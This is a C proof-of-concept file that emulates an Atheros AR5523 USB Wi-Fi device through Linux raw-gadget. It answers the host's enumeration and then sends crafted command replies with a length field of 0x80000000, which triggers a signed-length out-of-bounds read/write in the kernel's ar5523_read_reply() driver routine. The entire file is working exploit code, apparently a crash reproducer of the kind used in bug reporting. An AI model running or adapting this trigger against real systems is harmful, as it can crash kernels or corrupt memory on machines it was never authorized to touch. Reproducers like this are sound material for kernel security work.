// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>
#include <pthread.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/sysmacros.h>
#include <sys/types.h>
#include <linux/types.h>

#define USB_DIR_OUT			0
#define USB_DIR_IN			0x80

#define USB_TYPE_MASK			(0x03 << 5)
#define USB_TYPE_STANDARD		(0x00 << 5)

#define USB_REQ_GET_STATUS		0x00
#define USB_REQ_CLEAR_FEATURE		0x01
#define USB_REQ_SET_FEATURE		0x03
#define USB_REQ_SET_ADDRESS		0x05
#define USB_REQ_GET_DESCRIPTOR		0x06
#define USB_REQ_SET_DESCRIPTOR		0x07
#define USB_REQ_GET_CONFIGURATION	0x08
#define USB_REQ_SET_CONFIGURATION	0x09
#define USB_REQ_GET_INTERFACE		0x0A
#define USB_REQ_SET_INTERFACE		0x0B

#define USB_DT_DEVICE			0x01
#define USB_DT_CONFIG			0x02
#define USB_DT_STRING			0x03
#define USB_DT_INTERFACE		0x04
#define USB_DT_ENDPOINT			0x05

#define USB_SPEED_HIGH			3

struct usb_ctrlrequest {
	__u8	bRequestType;
	__u8	bRequest;
	__u16	wValue;
	__u16	wIndex;
	__u16	wLength;
} __attribute__((packed));

struct ep_desc {
	__u8	bLength;
	__u8	bDescriptorType;
	__u8	bEndpointAddress;
	__u8	bmAttributes;
	__u16	wMaxPacketSize;
	__u8	bInterval;
	__u8	bRefresh;
	__u8	bSynchAddress;
} __attribute__((packed));

#define UDC_NAME_LENGTH_MAX 128

struct usb_raw_init {
	__u8	driver_name[UDC_NAME_LENGTH_MAX];
	__u8	device_name[UDC_NAME_LENGTH_MAX];
	__u8	speed;
};

enum usb_raw_event_type {
	USB_RAW_EVENT_INVALID	 = 0,
	USB_RAW_EVENT_CONNECT	 = 1,
	USB_RAW_EVENT_CONTROL	 = 2,
	USB_RAW_EVENT_SUSPEND	 = 3,
	USB_RAW_EVENT_RESUME	 = 4,
	USB_RAW_EVENT_RESET	 = 5,
	USB_RAW_EVENT_DISCONNECT = 6,
};

struct usb_raw_event {
	__u32	type;
	__u32	length;
	__u8	data[0];
};

struct usb_raw_ep_io {
	__u16	ep;
	__u16	flags;
	__u32	length;
	__u8	data[0];
};

#define USB_RAW_IOCTL_INIT		_IOW('U', 0, struct usb_raw_init)
#define USB_RAW_IOCTL_RUN		_IO('U', 1)
#define USB_RAW_IOCTL_EVENT_FETCH	_IOR('U', 2, struct usb_raw_event)
#define USB_RAW_IOCTL_EP0_WRITE		_IOW('U', 3, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP0_READ		_IOWR('U', 4, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_ENABLE		_IOW('U', 5, struct ep_desc)
#define USB_RAW_IOCTL_EP_DISABLE	_IOW('U', 6, __u32)
#define USB_RAW_IOCTL_EP_WRITE		_IOW('U', 7, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_EP_READ		_IOWR('U', 8, struct usb_raw_ep_io)
#define USB_RAW_IOCTL_CONFIGURE		_IO('U', 9)
#define USB_RAW_IOCTL_VBUS_DRAW		_IOW('U', 10, __u32)
#define USB_RAW_IOCTL_EP0_STALL		_IO('U', 12)

struct usb_raw_control_event {
	struct usb_raw_event	inner;
	struct usb_ctrlrequest	ctrl;
};

struct usb_raw_ep_io_data {
	struct usb_raw_ep_io	inner;
	__u8			data[2048];
};

#define WDCMSG_TARGET_GET_STATUS	0x06
#define AR5523_CMD_ID			1

#define AR5523_HDR_LEN		32
#define REPLY_LEN		40

static int fd = -1;

static void die(const char *what)
{
	fprintf(stderr, "[-] %s: %s\n", what, strerror(errno));
	fflush(stderr);
	exit(1);
}

static int usb_raw_open(void)
{
	int f = open("/dev/raw-gadget", O_RDWR);

	if (f >= 0)
		return f;

	if (errno == ENOENT) {
		FILE *fp = fopen("/proc/misc", "r");
		int minor_no = -1;
		char name[64];
		int m;

		if (fp) {
			while (fscanf(fp, "%d %63s", &m, name) == 2) {
				if (!strcmp(name, "raw-gadget")) {
					minor_no = m;
					break;
				}
			}
			fclose(fp);
		}
		if (minor_no >= 0) {
			mknod("/dev/raw-gadget", S_IFCHR | 0600,
			      makedev(10, minor_no));
			f = open("/dev/raw-gadget", O_RDWR);
			if (f >= 0)
				return f;
		}
	}
	die("open(/dev/raw-gadget)");
	return -1;
}

static void usb_raw_init_dev(int f, const char *driver, const char *device,
			     __u8 speed)
{
	struct usb_raw_init arg;

	memset(&arg, 0, sizeof(arg));
	strncpy((char *)&arg.driver_name[0], driver, UDC_NAME_LENGTH_MAX - 1);
	strncpy((char *)&arg.device_name[0], device, UDC_NAME_LENGTH_MAX - 1);
	arg.speed = speed;
	if (ioctl(f, USB_RAW_IOCTL_INIT, &arg) < 0)
		die("ioctl(USB_RAW_IOCTL_INIT)");
}

static void usb_raw_run(int f)
{
	if (ioctl(f, USB_RAW_IOCTL_RUN, 0) < 0)
		die("ioctl(USB_RAW_IOCTL_RUN)");
}

static void usb_raw_event_fetch(int f, struct usb_raw_event *event)
{
	if (ioctl(f, USB_RAW_IOCTL_EVENT_FETCH, event) < 0)
		die("ioctl(USB_RAW_IOCTL_EVENT_FETCH)");
}

static int usb_raw_ep0_write(int f, struct usb_raw_ep_io *io)
{
	int rv = ioctl(f, USB_RAW_IOCTL_EP0_WRITE, io);

	if (rv < 0)
		fprintf(stderr, "[!] ep0_write: %s\n", strerror(errno));
	return rv;
}

static int usb_raw_ep0_read(int f, struct usb_raw_ep_io *io)
{
	int rv = ioctl(f, USB_RAW_IOCTL_EP0_READ, io);

	if (rv < 0)
		fprintf(stderr, "[!] ep0_read: %s\n", strerror(errno));
	return rv;
}

static void usb_raw_ep0_stall(int f)
{
	ioctl(f, USB_RAW_IOCTL_EP0_STALL, 0);
}

static int usb_raw_ep_enable(int f, struct ep_desc *desc)
{
	int rv = ioctl(f, USB_RAW_IOCTL_EP_ENABLE, desc);

	if (rv < 0)
		fprintf(stderr, "[!] ep_enable(0x%02x): %s\n",
			desc->bEndpointAddress, strerror(errno));
	return rv;
}

static void usb_raw_configure(int f)
{
	if (ioctl(f, USB_RAW_IOCTL_CONFIGURE, 0) < 0)
		fprintf(stderr, "[!] configure: %s\n", strerror(errno));
}

static void usb_raw_vbus_draw(int f, __u32 power)
{
	ioctl(f, USB_RAW_IOCTL_VBUS_DRAW, power);
}

static unsigned char device_desc[18] = {
	18,
	USB_DT_DEVICE,
	0x00, 0x02,
	0x00,
	0x00,
	0x00,
	64,
	0x8c, 0x16,
	0x01, 0x00,
	0x00, 0x01,
	0x00,
	0x00,
	0x00,
	0x01,
};

#define CONFIG_TOTAL_LEN (9 + 9 + 4 * 7)

static unsigned char config_desc[CONFIG_TOTAL_LEN] = {

	9, USB_DT_CONFIG,
	CONFIG_TOTAL_LEN & 0xff, (CONFIG_TOTAL_LEN >> 8) & 0xff,
	1,
	1,
	0,
	0xa0,
	0x32,

	9, USB_DT_INTERFACE,
	0,
	0,
	4,
	0xff, 0x00, 0x00,
	0,

	7, USB_DT_ENDPOINT, 0x01, 0x02, 0x00, 0x02, 0,

	7, USB_DT_ENDPOINT, 0x02, 0x02, 0x00, 0x02, 0,

	7, USB_DT_ENDPOINT, 0x81, 0x02, 0x00, 0x02, 0,

	7, USB_DT_ENDPOINT, 0x82, 0x02, 0x00, 0x02, 0,
};

static struct ep_desc ep_descs[4] = {
	{ 7, USB_DT_ENDPOINT, 0x01, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x02, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x81, 0x02, 512, 0, 0, 0 },
	{ 7, USB_DT_ENDPOINT, 0x82, 0x02, 512, 0, 0, 0 },
};

static int ep_handle[4] = { -1, -1, -1, -1 };
#define EP_CMD_TX	0
#define EP_DATA_TX	1
#define EP_CMD_RX	2
#define EP_DATA_RX	3

static volatile int configured;

static void build_reply(unsigned char *p)
{
	memset(p, 0, REPLY_LEN);

	p[0] = 0x00; p[1] = 0x00; p[2] = 0x00; p[3] = REPLY_LEN;

	p[4] = 0x00; p[5] = 0x00; p[6] = 0x00; p[7] = WDCMSG_TARGET_GET_STATUS;

	*(uint32_t *)(p + 8) = AR5523_CMD_ID;

	p[32] = 0x80; p[33] = 0x00; p[34] = 0x00; p[35] = 0x00;

	p[36] = 0x41; p[37] = 0x41; p[38] = 0x41; p[39] = 0x41;
}

static void *cmd_worker(void *arg)
{
	static struct usb_raw_ep_io_data io;
	unsigned char reply[REPLY_LEN];
	int round = 0;

	(void)arg;
	build_reply(reply);

	while (!configured)
		usleep(1000);

	printf("[*] worker: configured, serving AR5523 command replies\n");

	for (;;) {
		int rv;

		memset(&io, 0, sizeof(io));
		io.inner.ep = ep_handle[EP_CMD_TX];
		io.inner.flags = 0;
		io.inner.length = sizeof(io.data);
		rv = ioctl(fd, USB_RAW_IOCTL_EP_READ, &io);
		if (rv < 0) {
			fprintf(stderr, "[!] ep_read(cmd_tx): %s\n",
				strerror(errno));
			usleep(10000);
			continue;
		}

		printf("[*] round %d: got %d-byte command (code 0x%02x), "
		       "replying with olen = 0x80000000\n",
		       round, rv, rv > 7 ? io.data[7] : 0);

		memset(&io, 0, sizeof(io));
		io.inner.ep = ep_handle[EP_CMD_RX];
		io.inner.flags = 0;
		io.inner.length = REPLY_LEN;
		memcpy(&io.data[0], reply, REPLY_LEN);
		rv = ioctl(fd, USB_RAW_IOCTL_EP_WRITE, &io);
		if (rv < 0) {
			fprintf(stderr, "[!] ep_write(cmd_rx): %s\n",
				strerror(errno));
			usleep(10000);
			continue;
		}
		round++;
	}
	return NULL;
}

static void enable_endpoints(void)
{
	int i;

	for (i = 0; i < 4; i++) {
		if (ep_handle[i] >= 0)
			continue;
		ep_handle[i] = usb_raw_ep_enable(fd, &ep_descs[i]);
		printf("[*] ep 0x%02x -> handle %d\n",
		       ep_descs[i].bEndpointAddress, ep_handle[i]);
	}
}

static int handle_control(struct usb_ctrlrequest *ctrl,
			  struct usb_raw_ep_io_data *io)
{
	int len;

	io->inner.ep = 0;
	io->inner.flags = 0;
	io->inner.length = 0;

	if ((ctrl->bRequestType & USB_TYPE_MASK) != USB_TYPE_STANDARD)
		return -1;

	switch (ctrl->bRequest) {
	case USB_REQ_GET_DESCRIPTOR:
		switch (ctrl->wValue >> 8) {
		case USB_DT_DEVICE:
			len = sizeof(device_desc);
			if (len > ctrl->wLength)
				len = ctrl->wLength;
			memcpy(&io->data[0], device_desc, len);
			io->inner.length = len;
			return 0;
		case USB_DT_CONFIG:
			len = sizeof(config_desc);
			if (len > ctrl->wLength)
				len = ctrl->wLength;
			memcpy(&io->data[0], config_desc, len);
			io->inner.length = len;
			return 0;
		case USB_DT_STRING:

			io->data[0] = 4;
			io->data[1] = USB_DT_STRING;
			io->data[2] = 0x09;
			io->data[3] = 0x04;
			len = 4;
			if (len > ctrl->wLength)
				len = ctrl->wLength;
			io->inner.length = len;
			return 0;
		default:
			return -1;
		}

	case USB_REQ_SET_CONFIGURATION:
		enable_endpoints();
		usb_raw_vbus_draw(fd, 0x32);
		usb_raw_configure(fd);
		io->inner.length = 0;
		configured = 1;
		return 0;

	case USB_REQ_GET_CONFIGURATION:
		io->data[0] = 1;
		io->inner.length = 1;
		return 0;

	case USB_REQ_SET_INTERFACE:
		io->inner.length = 0;
		return 0;

	case USB_REQ_GET_INTERFACE:
		io->data[0] = 0;
		io->inner.length = 1;
		return 0;

	case USB_REQ_GET_STATUS:
		io->data[0] = 0;
		io->data[1] = 0;
		len = 2;
		if (len > ctrl->wLength)
			len = ctrl->wLength;
		io->inner.length = len;
		return 0;

	case USB_REQ_CLEAR_FEATURE:
	case USB_REQ_SET_FEATURE:
		io->inner.length = 0;
		return 0;

	default:
		return -1;
	}
}

static void bail_out(int sig)
{
	(void)sig;
	printf("[-] timed out without a crash\n");
	fflush(stdout);
	_exit(2);
}

int main(void)
{
	struct usb_raw_control_event event;
	static struct usb_raw_ep_io_data io;
	pthread_t th;

	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	printf("[*] ar5523 ar5523_read_reply() signed-olen OOB PoC\n");

	signal(SIGALRM, bail_out);
	alarm(120);

	fd = usb_raw_open();
	usb_raw_init_dev(fd, "dummy_udc", "dummy_udc.0", USB_SPEED_HIGH);
	printf("[+] raw-gadget bound to dummy_udc.0 (high speed)\n");

	if (pthread_create(&th, NULL, cmd_worker, NULL) != 0)
		die("pthread_create");

	usb_raw_run(fd);
	printf("[+] gadget running, waiting for enumeration\n");

	for (;;) {
		memset(&event, 0, sizeof(event));
		event.inner.type = 0;
		event.inner.length = sizeof(event.ctrl);
		usb_raw_event_fetch(fd, (struct usb_raw_event *)&event);

		if (event.inner.type == USB_RAW_EVENT_CONNECT) {
			printf("[*] event: CONNECT\n");
			continue;
		}
		if (event.inner.type == USB_RAW_EVENT_RESET) {
			printf("[*] event: RESET\n");
			continue;
		}
		if (event.inner.type != USB_RAW_EVENT_CONTROL) {
			printf("[*] event: %u\n", event.inner.type);
			continue;
		}

		printf("[*] ctrl: bRequestType=0x%02x bRequest=0x%02x "
		       "wValue=0x%04x wIndex=0x%04x wLength=%u\n",
		       event.ctrl.bRequestType, event.ctrl.bRequest,
		       event.ctrl.wValue, event.ctrl.wIndex,
		       event.ctrl.wLength);

		memset(&io, 0, sizeof(io));
		if (handle_control(&event.ctrl, &io) < 0) {
			usb_raw_ep0_stall(fd);
			continue;
		}

		if ((event.ctrl.bRequestType & USB_DIR_IN) && event.ctrl.wLength) {
			usb_raw_ep0_write(fd, (struct usb_raw_ep_io *)&io);
		} else {
			io.inner.length = 0;
			usb_raw_ep0_read(fd, (struct usb_raw_ep_io *)&io);
		}
	}

	return 0;
}
